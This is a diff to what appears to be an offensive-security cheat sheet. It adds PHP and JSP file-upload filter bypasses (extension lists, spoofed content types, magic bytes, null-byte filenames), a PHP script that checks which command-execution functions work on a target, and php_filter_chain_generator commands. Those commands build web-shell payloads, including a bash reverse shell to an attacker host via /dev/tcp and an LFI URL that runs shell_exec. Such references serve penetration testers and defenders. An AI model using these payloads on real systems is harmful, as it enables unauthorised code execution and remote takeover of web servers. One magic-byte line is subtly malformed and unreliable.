@@ -2710,10 +2710,161 @@ $ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
 
 ## PHP
 
+### PHP Upload Filter Bypasses
+
+```c
+.sh
+.cgi
+.inc
+.txt
+.pht
+.phtml
+.phP
+.Php
+.php3
+.php4
+.php5
+.php7
+.pht
+.phps
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.jpeg
+```
+
+### Content-Types
+
+```c
+Content-Type : image/gif
+Content-Type : image/png
+Content-Type : image/jpeg
+```
+
+### Magic Bytes
+
+#### PNG
+
+```c
+\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
+```
+
+#### JPG
+
+```c
+\xff\xd8\xff
+```
+
+#### GIF
+
+```c
+GIF8;
+GIF87a
+```
+
+### Java Server Pages (JSP) Upload Filter Bypasses
+
+```c
+.MF
+.jspx
+.jspf
+.jsw
+.jsv
+.xml
+.war
+.jsp
+.aspx
+```
+
+### Examples
+
+```c
+<FILE>.php%20
+<FILE>.php%0d%0a.jpg
+<FILE>.php%0a
+<FILE>.php.jpg
+<FILE>.php%00.gif
+<FILE>.php\x00.gif
+<FILE>.php%00.png
+<FILE>.php\x00.png
+<FILE>.php%00.jpg
+<FILE>.php\x00.jpg
+$ mv <FILE>.jpg <FILE>.php\x00.jpg
+```
+
 ### phpinfo Dump
 
 ```c
 file_put_contents to put <?php phpinfo(); ?>
+```
+
+### Checking for Remote Code Execution (RCE)
+
+> https://gist.github.com/jaquen/aab510eead65c9c95aa20a69d89c9d2a?s=09
+
+```c
+<?php
+
+// A script to check what you can use for RCE on a target
+
+$test_command = 'echo "time for some fun!"';
+$functions_to_test = [
+    'system',
+    'shell_exec',
+    'exec',
+    'passthru',
+    'popen',
+    'proc_open',
+];
+
+function test_function($func_name, $test_command) {
+    if (function_exists($func_name)) {
+        try {
+            $output = @$func_name($test_command);
+            if ($output) {
+                echo "Function '{$func_name}' enabled and executed the test command.\n";
+            } else {
+                echo "Function '{$func_name}' enabled, but failed to execute the test command.\n";
+            }
+        } catch (Throwable $e) {
+            echo "Function '{$func_name}' enabled, but an error occurred: {$e->getMessage()}\n";
+        }
+    } else {
+        echo "Function '{$func_name}' disabled or not available.\n";
+    }
+}
+
+foreach ($functions_to_test as $func) {
+    test_function($func, $test_command);
+} ?>
+```
+
+### PHP Filter Chain Generator
+
+> https://github.com/synacktiv/php_filter_chain_generator
+
+```c
+$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
+$ python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
+$ python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
+$ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
+$ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
+```
+
+#### Payload Execution
+
+```c
+http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
+```
+
+OR
+
+```c
+$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
+[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
 ```
 
 ### PHP Deserialization (Web Server Poisoning)
@@ -2896,7 +3047,7 @@ if (!empty($_POST['username']) && !empty($_POST['password'])) {
 }
 ```
 
-##### Explaination
+##### Explanation
 
 The developer is using `strcmp` to check the `username` and `password`, which is insecure and can easily be bypassed.
 
